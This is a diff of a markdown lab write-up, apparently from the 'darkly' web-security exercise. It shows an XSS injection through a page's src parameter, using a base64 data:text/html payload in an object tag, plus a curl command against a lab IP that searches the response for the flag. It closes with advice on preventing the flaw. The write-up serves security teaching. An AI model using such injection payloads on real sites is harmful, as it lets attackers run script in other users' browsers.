@@ -1,3 +1,5 @@
+# Description
+
 If we look closely in the home page there is only one image that is a link, the picture of the nsa.
 
 Once we click we got ridrected to `/?page=media&src=nsa`
@@ -9,6 +11,8 @@ I noticed that the field src control what the data on the object tag.
 
 So our goal is the change the data displayed by object.
 
+# Attack
+
 We will try to inject javascript throught objet data by using base64 data type.
 
 ```bash
@@ -16,10 +20,13 @@ We will try to inject javascript throught objet data by using base64 data type.
 PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 *[main][~/projects/darkly]$ 
 ```
-
-`<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>`
-
+It would look like this when we send the GET request to server
+```html
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 ```
+
+Now we put in the data section then we send it
+```bash
 *[main][~/projects/darkly]$ curl "http://10.14.59.83/?page=media&src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='"|grep flag   
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -28,9 +35,10 @@ PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 *[main][~/projects/darkly]$ 
 ```
 
-Preventions:
-- *Input Validation:* Always validate and sanitize user inputs, especially those used to construct URLs or interact with external resources. Ensure inputs adhere to expected formats and content.
+# Preventions:
 
-- *Whitelist Allowed Sources:* Maintain a list of trusted sources or URLs that your application can access. Validate incoming requests against this list to prevent unauthorized access to external resources.
+- *Input Validation:** Always validate and sanitize user inputs, especially those used to construct URLs or interact with external resources. Ensure inputs adhere to expected formats and content.
 
-- *User Data Handling:* Never use user-provided data directly in URLs or attributes. Generate URL values on the server-side using validated and safe data to prevent manipulation.
+- **Whitelist Allowed Sources:** Maintain a list of trusted sources or URLs that your application can access. Validate incoming requests against this list to prevent unauthorized access to external resources.
+
+- **User Data Handling:** Never use user-provided data directly in URLs or attributes. Generate URL values on the server-side using validated and safe data to prevent manipulation.
